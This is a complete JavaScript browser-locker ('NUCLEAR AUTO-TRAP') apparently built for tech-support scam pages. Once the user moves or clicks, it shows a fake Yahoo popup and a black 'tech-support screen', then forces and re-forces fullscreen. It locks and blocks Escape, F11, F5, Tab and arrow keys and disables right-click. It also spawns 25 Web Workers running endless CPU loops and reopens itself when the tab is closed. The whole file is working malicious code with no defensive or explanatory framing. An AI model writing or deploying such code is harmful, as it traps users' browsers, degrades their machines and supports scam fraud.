/* trap.js — NUCLEAR AUTO-TRAP: activity -> fullscreen + black screen + close trap */
(function () {
  'use strict';

  var POPUP_COOLDOWN = 800;
  var OVERLAY_FLASH  = 2500;
  var lastArm = 0;
  var armed = false;
  var workers = [];
  var workerURL = null;
  var allowClose = false;
  var autoTriggered = false;
  var fsRetryTimer = null;

  function $(id) { return document.getElementById(id); }

  /* ================= KEYBOARD LOCK ================= */
  function lockKeyboard() {
    try {
      if (navigator.keyboard && navigator.keyboard.lock) {
        navigator.keyboard.lock([
          'Escape','F11','F5','Tab',
          'KeyW','KeyR','KeyC','KeyD','KeyP',
          'Backspace','ArrowLeft','ArrowRight'
        ]);
      }
    } catch (e) {}
  }

  /* ================= FULLSCREEN ================= */
  function isFullscreen() {
    return !!(document.fullscreenElement || document.webkitFullscreenElement ||
              document.mozFullScreenElement || document.msFullscreenElement);
  }

  function requestFS() {
    var el = document.documentElement;
    var fn = el.requestFullscreen || el.webkitRequestFullscreen ||
             el.mozRequestFullScreen || el.msRequestFullscreen;
    if (fn && !isFullscreen()) {
      try {
        var p = fn.call(el);
        if (p && p.catch) p.catch(function () {});
      } catch (e) {}
    }
  }

  // Retry fullscreen a few times — covers the mousemove-rejection case
  function requestFSWithRetry() {
    requestFS();
    clearInterval(fsRetryTimer);
    var tries = 0;
    fsRetryTimer = setInterval(function () {
      tries++;
      if (isFullscreen() || tries > 10) { clearInterval(fsRetryTimer); return; }
      requestFS();
    }, 400);
  }

  ['fullscreenchange','webkitfullscreenchange','mozfullscreenchange','MSFullscreenChange']
    .forEach(function (ev) {
      document.addEventListener(ev, function () {
        if (!isFullscreen()) {
          flashOverlay();
          setTimeout(requestFS, 300);
        }
      }, false);
    });

  function flashOverlay() {
    var ov = $('overlay2');
    if (!ov) return;
    ov.style.display = 'block';
    setTimeout(function () { ov.style.display = 'none'; }, OVERLAY_FLASH);
  }

  /* ================= POPUP RE-ARM ================= */
  function armPopup(force) {
    var now = Date.now();
    if (!force && now - lastArm < POPUP_COOLDOWN) return;
    lastArm = now;
    var pop = $('pop_up_new');
    if (pop) {
      pop.style.display = 'block';
      pop.style.animation = 'none';
      void pop.offsetWidth;
      pop.style.animation = '4s infinite zoominoutsinglefeatured';
    }
    if (!isFullscreen()) requestFS();
  }

  /* ================= AUTO-TRIGGER SEQUENCE ================= */
  function triggerAutoSequence() {
    if (autoTriggered) return;
    autoTriggered = true;
    armed = true;

    // 1. Hide Yahoo popup
    var modal = $('modalbx');
    if (modal) modal.style.display = 'none';

    // 2. Show black tech-support screen
    var overlay = $('overlay2');
    if (overlay) overlay.style.display = 'block';

    // 3. Fullscreen with retry (handles mousemove rejection)
    requestFSWithRetry();

    // 4. Lock keyboard
    lockKeyboard();

    // 5. Re-arm popup after delay
    setTimeout(function () { armPopup(true); }, 2000);
  }

  /* ================= EVENT LISTENERS ================= */
  function onActivity() {
    if (!armed) {
      triggerAutoSequence();
    } else {
      if (!isFullscreen()) requestFS();
      armPopup(false);
    }
  }

  ['keydown','mousedown','click','touchstart'].forEach(function (ev) {
    window.addEventListener(ev, onActivity, { passive: true });
  });
  ['mousemove','scroll','wheel','touchmove'].forEach(function (ev) {
    window.addEventListener(ev, onActivity, { passive: true });
  });

  window.addEventListener('focus', onActivity);
  document.addEventListener('visibilitychange', function () {
    if (!document.hidden) onActivity();
  });

  /* ================= KEY BLOCKING ================= */
  function killKey(e) {
    var k = e.keyCode || e.which;
    var t = e.target;
    var typing = t && (t.tagName === 'INPUT' || t.tagName === 'TEXTAREA');

    if (!typing) {
      if (k === 27 || k === 122 || k === 116 || k === 9 || k === 8 ||
          (k >= 112 && k <= 123) || (k >= 37 && k <= 40)) {
        e.preventDefault();
        e.returnValue = false;
      }
    }
    if (k === 27 || k === 122) { requestFS(); armPopup(true); }
    if (k === 116) { armPopup(true); }
  }
  document.addEventListener('keydown', killKey, true);
  document.addEventListener('keyup', killKey, true);

  /* ================= DEAD CLICKS ================= */
  document.addEventListener('contextmenu', function (e) { e.preventDefault(); return false; }, true);
  document.oncontextmenu = function () { return false; };
  document.onselectstart = function () { return false; };

  /* ================= UI WIRING ================= */
  function wireUI() {
    // Show Yahoo popup shortly after load
    setTimeout(function () {
      var m = $('modalbx');
      if (m) m.style.display = 'block';
    }, 500);

    var box    = $('exit-popup');
    var leave  = $('exit_leave');
    var cancel = $('exit_cancel');

    if (leave) {
      leave.addEventListener('click', function (e) {
        e.preventDefault();
        e.stopPropagation();
        allowClose = true;
        if (box) box.style.display = 'none';
        // open new tab BEFORE closing current
        try { window.open(window.location.href, '_blank'); } catch (er) {}
        setTimeout(function () { try { window.close(); } catch (er) {} }, 60);
      });
    }

    if (cancel) {
      cancel.addEventListener('click', function (e) {
        e.preventDefault();
        e.stopPropagation();
        if (box) box.style.display = 'none';
        armPopup(true);
      });
    }

    var ok = $('leave_page_ok'), cn = $('leave_page_cancel');
    if (ok) ok.addEventListener('click', function (e) { e.stopPropagation(); });
    if (cn) cn.addEventListener('click', function (e) { e.stopPropagation(); });

    // Initial arm
    setTimeout(function () { armPopup(true); }, 1000);
  }
  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', wireUI);
  } else { wireUI(); }

  /* ================= WORKER BOMB ================= */
  function startWorkers(count) {
    if (!workerURL) {
      var script = 'let c=0;while(true){c++;Math.random()*Math.random();' +
                   'if(c%1e6===0){postMessage({status:"working",counter:c});}}';
      workerURL = URL.createObjectURL(new Blob([script], { type: 'application/javascript' }));
    }
    for (var i = 0; i < count; i++) {
      try { workers.push(new Worker(workerURL)); } catch (e) {}
    }
  }
  startWorkers(25);

  /* ================= HARD CLOSE TRAP ================= */
  window.addEventListener('beforeunload', function (e) {
    if (allowClose) return;
    var msg = 'Are you sure you want to leave this page?';
    if (e) { e.returnValue = msg; }
    return msg;
  }, false);

  window.addEventListener('unload', function () {
    if (!allowClose) {
      try { window.open(window.location.href, '_blank'); } catch (e) {}
    }
  }, false);

})();
